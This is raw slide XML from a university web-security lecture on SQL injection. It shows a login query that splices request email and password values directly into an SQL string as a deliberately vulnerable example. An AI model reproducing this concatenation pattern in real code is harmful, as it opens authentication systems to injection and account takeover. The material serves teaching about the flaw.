              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t>INJECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t>VULNERABILITIES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962050" y="1533220"/>
            <a:ext cx="10057765" cy="1732914"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="195580" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Suppose</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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server-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side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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looks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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like</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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one</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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shown</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>below</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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parameters</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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directly</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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inserted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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query</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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executed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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database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882396" y="3429000"/>
            <a:ext cx="10427335" cy="2862580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="32384" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342265" marR="7319009" indent="-250190">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="254"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>models.sequelize.query(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>` </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>${</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>req.body.email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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||</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="591820">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>${</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>security.hash(req.body.password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-80"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||</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="591820">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>deletedAt</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>IS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>NULL`</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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{</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25"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model:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15"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UserModel,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20"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plain:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25"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00FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20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dirty="0" sz="1800" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>})</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>.then((authenticatedUser:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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{</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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data:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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User</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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})</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20"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00FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20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dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/*</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>found,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>handle</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>*/</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}.catch(err){</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>next(err);</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t>INJECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t>VULNERABILITIES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962050" y="1533220"/>
            <a:ext cx="9661525" cy="1348740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Normally,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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when</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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users</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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tries</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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log</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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in,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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intended</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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values</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>are </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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substituted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>query,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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without</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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altering</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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its</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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structure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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nature</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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login</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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feature</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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works</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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intended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4163567" y="3340608"/>
            <a:ext cx="7146290" cy="1477010"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="31750" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="250"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> *</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
